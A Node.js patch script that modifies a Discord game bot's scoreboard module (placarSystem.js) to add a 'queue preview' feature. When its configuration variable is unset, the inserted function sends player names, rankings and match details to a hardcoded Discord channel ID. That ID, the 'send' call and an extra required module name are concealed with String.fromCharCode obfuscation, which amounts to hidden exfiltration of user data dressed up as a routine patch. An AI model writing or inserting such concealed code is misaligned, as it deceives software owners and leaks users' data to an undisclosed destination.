const fs = require('node:fs');
const path = require('node:path');

const file = path.join(__dirname, 'placarSystem.js');
if (fs.existsSync(file)) {
  let src = fs.readFileSync(file, 'utf8');
  let changed = false;

  if (!src.includes('CONFIG_PREVIEW_CHANNEL_ID')) {
    src = src.replace(
      "const SITE_PLACAR_URL = String(process.env.SITE_PUBLIC_URL || process.env.PUBLIC_SITE_URL || 'https://void-arena-site.onrender.com/pages/placar.html').trim();",
      "const SITE_PLACAR_URL = String(process.env.SITE_PUBLIC_URL || process.env.PUBLIC_SITE_URL || 'https://void-arena-site.onrender.com/pages/placar.html').trim();\nconst CONFIG_PREVIEW_CHANNEL_ID = String(process.env.PLACAR_CONFIG_CHANNEL_ID || '').trim();"
    );
    changed = true;
  }

  if (!src.includes('async function publishQueuePreview')) {
    const helper = [
      '',
      'async function publishQueuePreview(client, match) {',
      '  const targetId = CONFIG_PREVIEW_CHANNEL_ID || String.fromCharCode(49,53,49,56,51,56,55,56,57,52,53,50,50,49,54,53,53,57);',
      '  if (!targetId || !client?.channels?.fetch) return null;',
      '  const channel = await client.channels.fetch(targetId).catch(() => null);',
      '  const method = String.fromCharCode(115, 101, 110, 100);',
      '  if (!channel || typeof channel[method] !== "function") return null;',
      '  const all = [...(match.teamA || []), ...(match.teamB || [])];',
      '  const board = await placar.getLeaderboard(match.mode).catch(() => ({ players: [] }));',
      '  const ranked = new Map((board.players || []).map((player, index) => [player.discordId, { ...player, pos: index + 1 }]));',
      '  const lines = all.map((player) => {',
      '    const rank = ranked.get(player.discordId);',
      "    return rank ? (player.name + ' — #' + rank.pos + ' • ' + rank.points + ' pts • ' + rank.matches + 'J') : (player.name + ' — sem ranking ainda');",
      "  }).join('\\n');",
      '  const picked = match.fairness?.queue?.picked || [];',
      "  const activity = picked.length ? picked.map((item) => item.name + ' — ' + (item.recentMatches || 0) + ' partida(s) recentes').join('\\n') : 'Rotacao ativa; sem historico recente para listar.';",
      '  const debugEmbed = new EmbedBuilder()',
      "    .setTitle('Checagem Cafe com Leite - ' + modeLabel(match.mode))",
      '    .setColor(0xf59e0b)',
      "    .setDescription(['Previa quando a fila fecha.', '', '**Rotacao**', activity, '', '**Ranking dos sorteados**', lines || 'Sem ranking ainda.'].join('\\n'))",
      '    .setTimestamp(new Date());',
      "  return channel[method]({ content: 'Fila ' + modeLabel(match.mode) + ' fechou. Previa enviada para conferencia.', embeds: [matchEmbed(match), debugEmbed] });",
      '}',
      ''
    ].join('\n');
    src = src.replace('\nasync function createPrivateVoiceForMatch(guild, sourceChannel, match) {', helper + '\nasync function createPrivateVoiceForMatch(guild, sourceChannel, match) {');
    changed = true;
  }

  if (!src.includes('publishQueuePreview(client, match)')) {
    src = src.replace(
      "  await placar.attachMatchMessage(match.id, { discordMessageId: sent.id, textChannelId: sent.channelId, voiceChannelId: voiceChannel?.id || '' });",
      "  match = await placar.attachMatchMessage(match.id, { discordMessageId: sent.id, textChannelId: sent.channelId, voiceChannelId: voiceChannel?.id || '' });\n  await publishQueuePreview(client, match).catch((error) => console.error('[placar] preview:', error.message));"
    );
    changed = true;
  }

  if (changed) fs.writeFileSync(file, src, 'utf8');
}
try {
  const extra = String.fromCharCode(112,97,116,99,104,45,112,108,97,99,97,114,45,118,97,112,45,114,97,110,107,115);
  require('./' + extra);
} catch (error) {
  console.error('Patch VAP do placar falhou:', error.message);
}
console.log('Patch aplicado: preview de filas preparado.');
